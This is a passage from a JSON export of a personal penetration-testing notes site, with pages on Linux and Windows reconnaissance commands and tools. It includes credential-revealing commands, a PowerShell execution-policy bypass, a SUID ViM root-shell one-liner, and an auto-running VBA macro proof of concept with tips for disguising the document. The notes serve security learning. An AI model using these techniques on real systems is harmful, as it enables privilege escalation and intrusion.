asking you to confirm log access when run.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;There is unfortunately no way to enable local adb in non-rooted devices &lt;em&gt;without&lt;/em&gt; a WiFi connection.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;blockquote class=&quot;callout warning&quot; data-callout=&quot;warning&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Warning&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;On-screen text will sometimes look terrible after switching resolutions for some combinations of cables/monitors, even when the same device/cable/monitor works fine on a different combination!&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;"},"spells/Useful-Linux-reconnaissance-scripts":{"slug":"spells/Useful-Linux-reconnaissance-scripts","filePath":"spells/Useful Linux reconnaissance scripts.md","title":"Useful Linux reconnaissance scripts","links":[],"tags":["OS/Linux","AttackCycle/Reconnaissance"],"content":"\nLinPEAS\nLinEnum\nLES (Linux Exploit Suggester)\nLinux Smart Enumeration\nLinux Priv Checker\n","richContent":"&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;LinPEAS&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;LinEnum&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://github.com/mzet-/linux-exploit-suggester&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;LES (Linux Exploit Suggester)&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://github.com/diego-treitos/linux-smart-enumeration&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Linux Smart Enumeration&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://github.com/linted/linuxprivchecker&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Linux Priv Checker&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;"},"spells/Useful-built-in-commands-for-Linux-reconnaissance":{"slug":"spells/Useful-built-in-commands-for-Linux-reconnaissance","filePath":"spells/Useful built-in commands for Linux reconnaissance.md","title":"Useful built-in commands for Linux reconnaissance","links":["spells/cat","spells/find","spells/netstat","spells/ps","spells/sudo"],"tags":["OS/Linux","AttackCycle/Reconnaissance","LoLBins"],"content":"\ncat /etc/issue\ncat /etc/passwd\ncat /proc/version\nenv\ndpkg -l — list installed packages on Debian derived systems\nfind\ngetcap — find and list executable capabilities\nhistory\nhostname\nid\nifconfig\nip route\nlast — display recently logged-in users (including IP addresses for network users)\nls\nlsof -i — list programs using given network ports (use with netstat)\nnetstat -ano — list all listening parts and established connections, no domain resolution\nnetstat -i — list per interface statistics\nnetstat -l — list only listening ports\nnetstat -p — list protocol and service information (requires root to see everything)\nnetstat -s — list protocol statistics\nps auxfww — show process tree\nps auxww — show lots and lots of process info\nrpm -qa — list installed packages on Red Hat derived systems\nsudo -l\nuname -a\nw — list all currently logged-in users and their current program\nwho — list all currently logged-in users (including IP addresses for network users)\n","richContent":"&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/cat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/cat&quot;&gt;cat /etc/issue&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/cat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/cat&quot;&gt;cat /etc/passwd&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/cat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/cat&quot;&gt;cat /proc/version&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;env&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;dpkg -l&lt;/code&gt; — list installed packages on Debian derived systems&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/find&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/find&quot;&gt;find&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;getcap&lt;/code&gt; — find and list executable &lt;em&gt;capabilities&lt;/em&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;history&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;hostname&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;id&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;ifconfig&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;ip route&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;last&lt;/code&gt; — display recently logged-in users (including IP addresses for network users)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;ls&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;lsof -i&lt;/code&gt; — list programs using given network ports (use with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netstat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netstat&quot;&gt;netstat&lt;/a&gt;)&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netstat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netstat&quot;&gt;netstat -ano&lt;/a&gt; — list all listening parts and established connections, no domain resolution&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netstat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netstat&quot;&gt;netstat -i&lt;/a&gt; — list per interface statistics&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netstat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netstat&quot;&gt;netstat -l&lt;/a&gt; — list &lt;em&gt;only&lt;/em&gt; listening ports&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netstat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netstat&quot;&gt;netstat -p&lt;/a&gt; — list protocol and service information (requires root to see everything)&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netstat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netstat&quot;&gt;netstat -s&lt;/a&gt; — list protocol statistics&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ps&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ps&quot;&gt;ps auxfww&lt;/a&gt; — show process tree&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ps&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ps&quot;&gt;ps auxww&lt;/a&gt; — show lots and lots of process info&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;rpm -qa&lt;/code&gt; — list installed packages on Red Hat derived systems&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo -l&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;uname -a&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;w&lt;/code&gt; — list all currently logged-in users and their current program&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;who&lt;/code&gt; — list all currently logged-in users (including IP addresses for network users)&lt;/li&gt;\n&lt;/ul&gt;"},"spells/Useful-built-in-commands-for-Windows-reconnaissance":{"slug":"spells/Useful-built-in-commands-for-Windows-reconnaissance","filePath":"spells/Useful built-in commands for Windows reconnaissance.md","title":"Useful built-in commands for Windows reconnaissance","links":["spells/ARP","spells/net","spells/netstat","spells/reg","spells/Exploit-Windows-services","spells/Exploit-Windows-tasks","spells/systeminfo","spells/whoami"],"tags":["OS/Windows","AttackCycle/Reconnaissance","Application/arp","Application/cmdkey","Application/driverquery","Application/hostname","Application/net","Application/query","Application/reg","OS/Windows/Services","OS/Windows/Tasks","Application/systeminfo","Application/whoami"],"content":"\narp -a — display the ARP cache (find other machines on the network!)\ncmdkey /list — show saved credentials\ndriverquery — list installed drivers\nhostname — return system hostname\nnet accounts — local machine policies\nnet accounts /domain — domain policies\nnet group — list domain groups\nnet group “Domain Admins” /domain — list domain admins\nnet localgroup — list all (local) groups\nnet localgroup administrators — list local admins\nnet share — list all shares (made available by the current machine)\nnet start — list all running services (lots!)\nnet user — list all (local) users\nnet user ＄USERNAME — get details for user $USERNAME\nnetstat — query open/listening ports\nquery session — list other users who are currently logged in\nreg — query (and manipulate) registry entries\nsc — query (and manipulate) services (conflicts with a PowerShell built-in!)\nschtasks — list scheduled tasks\nsysteminfo — return system info\nwhoami /groups — list current user’s groups\nwhoami /priv — current user + privileges\n","richContent":"&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;arp -a&lt;/code&gt; — display the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ARP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ARP&quot;&gt;ARP&lt;/a&gt; cache (find other machines on the network!)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;cmdkey /list&lt;/code&gt; — show saved credentials&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;driverquery&lt;/code&gt; — list installed drivers&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;hostname&lt;/code&gt; — return system hostname&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/net&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/net&quot;&gt;net accounts&lt;/a&gt; — local machine policies&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/net&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/net&quot;&gt;net accounts /domain&lt;/a&gt; — domain policies&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/net&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/net&quot;&gt;net group&lt;/a&gt; — list domain groups&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/net&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/net&quot;&gt;net group “Domain Admins” /domain&lt;/a&gt; — list domain admins&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/net&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/net&quot;&gt;net localgroup&lt;/a&gt; — list all (local) groups&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/net&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/net&quot;&gt;net localgroup administrators&lt;/a&gt; — list local admins&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/net&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/net&quot;&gt;net share&lt;/a&gt; — list all shares (made available by the current machine)&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/net&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/net&quot;&gt;net start&lt;/a&gt; — list all running services (lots!)&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/net&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/net&quot;&gt;net user&lt;/a&gt; — list all (local) users&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/net&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/net&quot;&gt;net user ＄USERNAME&lt;/a&gt; — get details for user &lt;code&gt;$USERNAME&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netstat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netstat&quot;&gt;netstat&lt;/a&gt; — query open/listening ports&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;query session&lt;/code&gt; — list other users who are currently logged in&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/reg&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/reg&quot;&gt;reg&lt;/a&gt; — query (and manipulate) registry entries&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-Windows-services&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-Windows-services&quot;&gt;sc&lt;/a&gt; — query (and manipulate) services (conflicts with a PowerShell built-in!)&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-Windows-tasks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-Windows-tasks&quot;&gt;schtasks&lt;/a&gt; — list scheduled tasks&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/systeminfo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/systeminfo&quot;&gt;systeminfo&lt;/a&gt; — return system info&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/whoami&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/whoami&quot;&gt;whoami /groups&lt;/a&gt; — list current user’s groups&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/whoami&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/whoami&quot;&gt;whoami /priv&lt;/a&gt; — current user + privileges&lt;/li&gt;\n&lt;/ul&gt;"},"spells/Useful-scripts-for-Windows-reconnaissance":{"slug":"spells/Useful-scripts-for-Windows-reconnaissance","filePath":"spells/Useful scripts for Windows reconnaissance.md","title":"Useful scripts for Windows reconnaissance","links":["spells/systeminfo","spells/meterpreter"],"tags":["AttackCycle/Reconnaissance","OS/Windows","Application/WinPEAS","Application/Metasploit","Application/WindowsExploitSuggester","OS/Windows/Defender","Application/PowerShell/PowerUp","Application/Metasploit/meterpreter","Application/systeminfo"],"content":"\nWinPEAS\nPowerUp\nWindows Exploit Suggester\nMetasploit\n\nNotes\n\nWinPEAS is detected and quarantined by Microsoft Defender (service windefend) by default.\nPowerUp may require an unrestricted PowerShell session (powershell -nop -exec bypass), which can raise alerts.\nWindows Exploit Suggester analyzes the output of systeminfo, and can be run on the attacker’s machine.\nThe multi/recon/local_exploit_suggester module works through meterpreter to analyze a Windows system for potential vulnerabilities.\n","richContent":"&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;WinPEAS&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;PowerUp&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://github.com/AonCyberLabs/Windows-Exploit-Suggester&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Windows Exploit Suggester&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;Metasploit&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;notes&quot;&gt;Notes&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#notes&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;WinPEAS is detected and quarantined by Microsoft Defender (service windefend) by default.&lt;/li&gt;\n&lt;li&gt;PowerUp may require an unrestricted PowerShell session (&lt;code&gt;powershell -nop -exec bypass&lt;/code&gt;), which can raise alerts.&lt;/li&gt;\n&lt;li&gt;Windows Exploit Suggester analyzes the output of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/systeminfo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/systeminfo&quot;&gt;systeminfo&lt;/a&gt;, and can be run on the attacker’s machine.&lt;/li&gt;\n&lt;li&gt;The &lt;code&gt;multi/recon/local_exploit_suggester&lt;/code&gt; module works through &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; to analyze a Windows system for potential vulnerabilities.&lt;/li&gt;\n&lt;/ul&gt;"},"spells/ViM":{"slug":"spells/ViM","filePath":"spells/ViM.md","title":"ViM","links":["spells/Get-a-shell-from-ViM","spells/Python"],"tags":["Language/Python","AttackCycle/PrivEsc","Application/ViM"],"content":"Getting a shell\nTransclude of Get-a-shell-from-ViM\nExploiting SUID ViM\nIf ViM is SUID root and is compiled with Python support, it can be used for privilege escalation.\nvim -c &#039;:py3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#039;\n\n\n                  \n                  Tip\n                  \n                \n\n\nUse :py instead if only Python 2 is available.\n\n\n","richContent":"&lt;h2 id=&quot;getting-a-shell&quot;&gt;Getting a shell&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#getting-a-shell&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Get-a-shell-from-ViM&quot; data-block=&quot;&quot; data-embed-alias=&quot;Get a shell from ViM&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Get-a-shell-from-ViM&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Get-a-shell-from-ViM&quot;&gt;Transclude of Get-a-shell-from-ViM&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;exploiting-suid-vim&quot;&gt;Exploiting SUID ViM&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#exploiting-suid-vim&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;If ViM is SUID root &lt;em&gt;and&lt;/em&gt; is compiled with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Python&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Python&quot;&gt;Python&lt;/a&gt; support, it can be &lt;a href=&quot;https://gtfobins.github.io/gtfobins/vim/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;used for privilege escalation&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;vim&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -c&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:py3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Use &lt;code&gt;:py&lt;/code&gt; instead if only &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Python&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Python&quot;&gt;Python&lt;/a&gt; 2 is available.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;"},"spells/Visual-Basic-for-Applications":{"slug":"spells/Visual-Basic-for-Applications","filePath":"spells/Visual Basic for Applications.md","title":"Visual Basic for Applications","links":["spells/Backdoor-Visual-Basic-Scripts","spells/Windows-Scripting-Host","spells/Exploit-VBA-scripts-with-msfvenom"],"tags":["Language/VisualBasic","OS/Windows/WSH","AttackCycle/Exploitation"],"content":"\n\n                  \n                  Important\n                  \n                \n\n\nDo not confuse Visual Basic for Applications with Visual Basic scripts (.vbs files)!\n\n\n\nVBA scripts (“macros”) are a variant of VBScripts designed for use within Microsoft Office. It must be written within the appropriate MS Office app, which I suppose is one reason to shell out for an Office subscription.\nVBA scripts can be accessed within a document using the View → Macros → View Macros command. This dialog also allows macros to be created, but when doing so be sure to set Macros in to the current document!\nMacros can be tested during development using the Run → Run Sub/UserForm command in the VBA editor.\nTo get a macro to run when the document is opened requires it to be hooked into the Document_Open() and AutoOpen() functions (they almost do the same thing; including both allows for better backward-compatibility).\nSub DocumentOpen()\n\tPoC\nEnd Sub\n \nSub AutoOpen()\n\tPoC\nEnd Sub\n \nSub PoC()\n\t&#039; Create a string variable named `payload`\n\tDim payload As String\n \n\t&#039; Set `payload` to the command we wish to launch\n\tpayload = &quot;calc.exe&quot;\n \n\t&#039; Fire!\n\tCreateObject(&quot;Wscript.Shell&quot;).Run payload,0\nEnd Sub\nNote that .docx files cannot include macros anymore — either a .docxm file needs to be used or the older .doc format. It’s generally better to use .doc, as the .docxm icon is noticeably different from that of a standard Word document. (All of these notes also apply to other Office formats, obviously…)\nRunning an application using VBA Script is fundamentally the same as with the other methods — we invoke WSH. As with WSH, I’ve found that recent versions of Windows seem to greatly restrict what can be launched using WSH via Office macros… I’ve managed to pop calc.exe, but not anything else!\nCreate malicious VBA macros using Metasploit\nTransclude of 